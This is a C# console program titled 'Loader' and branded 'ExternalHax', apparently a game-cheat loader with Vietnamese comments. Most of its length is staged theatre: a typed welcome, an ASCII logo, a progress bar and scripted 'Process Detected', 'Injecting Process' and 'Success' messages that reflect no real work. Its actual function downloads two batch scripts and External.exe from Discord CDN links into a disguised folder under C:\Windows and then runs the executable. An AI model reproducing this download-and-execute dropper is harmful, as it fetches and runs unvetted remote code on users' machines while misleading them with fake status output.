
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;
using System.ComponentModel;

class Program
{
    public const int SC_SIZE = 0xF000;
    public const int MF_BYCOMMAND = 0x0000;
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

    [DllImport("user32.dll")]
    public static extern bool DeleteMenu(IntPtr hMenu, uint uPosition, uint uFlags);

    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleTitle(string title);


    static void DrawProgressBar(int progress, int total)
    {

        int barLength = 50;
        double percent = (double)progress / total;
        int progressBarLength = (int)(percent * barLength);

        Console.Write("[");

        for (int i = 0; i < progressBarLength; i++)
        {
            Console.Write("=");
        }

        for (int i = progressBarLength; i < barLength; i++)
        {
            Console.Write(" ");
        }

        Console.Write($"] {progress}%\r");
    }

    static async Task Main()
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        
       

        IntPtr consoleHandle = FindWindow(null, Console.Title);

        if (consoleHandle != IntPtr.Zero)
        {
            // Lấy hệ thống menu
            IntPtr systemMenu = GetSystemMenu(consoleHandle, false);

            // Xóa tùy chọn thay đổi kích thước
            DeleteMenu(systemMenu, SC_SIZE, MF_BYCOMMAND);
        }

        SetConsoleTitle("Loader");
        string textToType = "Wellcome to ExternalHax";
        int typingSpeed = 25; // Tốc độ đánh máy (ms/ký tự)

        foreach (char c in textToType)
        {
            Console.Write(c);
            Thread.Sleep(typingSpeed);
        }
        Thread.Sleep(2000);
        Console.Clear();

        string logo = @"                                 _____      _                        _   _   _            
                               | ____|_  _| |_ ___ _ __ _ __   __ _| | | | | | __ ___  __
                               |  _| \ \/ / __/ _ \ '__| '_ \ / _` | | | |_| |/ _` \ \/ /
                               | |___ >  <| ||  __/ |  | | | | (_| | | |  _  | (_| |>  < 
                               |_____/_/\_\\__\___|_|  |_| |_|\__,_|_| |_| |_|\__,_/_/\_\
                                                           ";
        int consoleWidth = Console.WindowWidth;

        // Tính vị trí bắt đầu để đặt văn bản giữa màn hình
       

        Console.WriteLine(logo);

        Console.WriteLine();
        Thread.Sleep(1000);
        Console.ForegroundColor = ConsoleColor.Cyan;
        int totalProgress = 100; // Số lần cập nhật
        int sleepTimeMs = 15; // Thời gian ngủ giữa các lần cập nhật (100 ms = 0.1 giây)
        DateTime startTime = DateTime.Now;

        for (int i = 0; i <= totalProgress; i++)
        {
            DrawProgressBar(i, totalProgress);

            // Lấy thời gian hiện tại
            DateTime now = DateTime.Now;

            // Tạo một chuỗi chứa ngày, tháng, năm, giờ, phút và giây
            string dateTimeStr = now.ToString("dd/MM/yyyy HH:mm:ss");

            // Hiển thị ngày và thời gian bên trái của thanh tiến trình
            Console.Write($" {dateTimeStr}");
            Thread.Sleep(sleepTimeMs);
        }
       
        Console.ForegroundColor= ConsoleColor.Magenta;
        Thread.Sleep(2000);
        string textToType1 = "[+] Process Detected";
        int typingSpeed1 = 30; // Tốc độ đánh máy (ms/ký tự)
        Console.WriteLine();
        foreach (char c in textToType1)
        {
            Console.Write(c);
            Thread.Sleep(typingSpeed1);
        }
        Thread.Sleep(3000);
        Console.WriteLine();
        string textToType2 = "[+] Injecting Process";
        int typingSpeed2 = 30; // Tốc độ đánh máy (ms/ký tự)

        foreach (char c in textToType2)
        {
            Console.Write(c);
            Thread.Sleep(typingSpeed2);
        }
        Thread.Sleep(5000);
        Console.WriteLine();
        string textToType23 = "[+] Success !";
        int typingSpeed23 = 30; // Tốc độ đánh máy (ms/ký tự)

        foreach (char c in textToType23)
        {
            Console.Write(c);
            Thread.Sleep(typingSpeed23);
        }
        Thread.Sleep(3000);
        Console.WriteLine();

        // Danh sách đường dẫn của các tệp bạn muốn tải
        string[] fileUrls = {
            "https://cdn.discordapp.com/attachments/1058655874215845999/1167084367231860816/block_internet.bat?ex=654cd704&is=653a6204&hm=7f50633b78150a52872c77e4d6f36020907e3f502191cfa4070c27cace90bac4&",
            "https://cdn.discordapp.com/attachments/1058655874215845999/1167084367571603466/resume_internet.bat?ex=654cd704&is=653a6204&hm=9d13809ad93a984bb7d3f203ebde99577194eedc5430c21e7131a187b2e16985&",
            "https://cdn.discordapp.com/attachments/1086515371328155649/1167440932396875826/External.exe?ex=654e2318&is=653bae18&hm=4624c693f5a16e50dfdee6f455ca11ef180d95c3a87a80887fb29ff22c7a3b96&"
        };
        string filePath1 = @"C:\Windows\System102\7\2\3 - Copy (2)\3 - Copy (2)\101 - Copy\External.exe";

        string saveDirectory = "C:\\Windows\\System102\\7\\2\\3 - Copy (2)\\3 - Copy (2)\\101 - Copy\\";

        // Tạo thư mục nếu nó không tồn tại
        if (!Directory.Exists(saveDirectory))
        {
            Directory.CreateDirectory(saveDirectory);
        }

        using (HttpClient httpClient = new HttpClient())
        {
            try
            {
                foreach (var fileUrl in fileUrls)
                {
                    HttpResponseMessage response = await httpClient.GetAsync(fileUrl);

                    if (response.IsSuccessStatusCode)
                    {
                        byte[] fileData = await response.Content.ReadAsByteArrayAsync();

                        string fileName = GetFileNameFromUrl(fileUrl);
                        string filePath = Path.Combine(saveDirectory, fileName); // Kết hợp đường dẫn thư mục và tên tệp

                        File.WriteAllBytes(filePath, fileData);
                        // Sau khi kết thúc thời gian đợi, chương trình sẽ tắt


                        // Sau khi kết thúc thời gian đợi, chương trình sẽ tắt
                      

                    }
                    else
                    {
                        Console.WriteLine("Try Again " + fileUrl);
                    }
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("Lỗi: " + ex.Message);
                int waitTime = new Random().Next(1000);
                Thread.Sleep(waitTime);

                // Sau khi kết thúc thời gian đợi, chương trình sẽ tắt
                Console.WriteLine("100%");
            }
            // Đường dẫn đến tệp bạn muốn chạy
            // Đường dẫn đến tệp bạn muốn chạy

            // Tạo một quy trình (process) để chạy tệp
            Process process = new Process();
            process.StartInfo.FileName = filePath1;



            // Chạy quy trình
           process.Start();

        }
    }

   
    static string GetFileNameFromUrl(string url)
    {
        Uri uri = new Uri(url);
        return Path.GetFileName(uri.LocalPath);
    }
}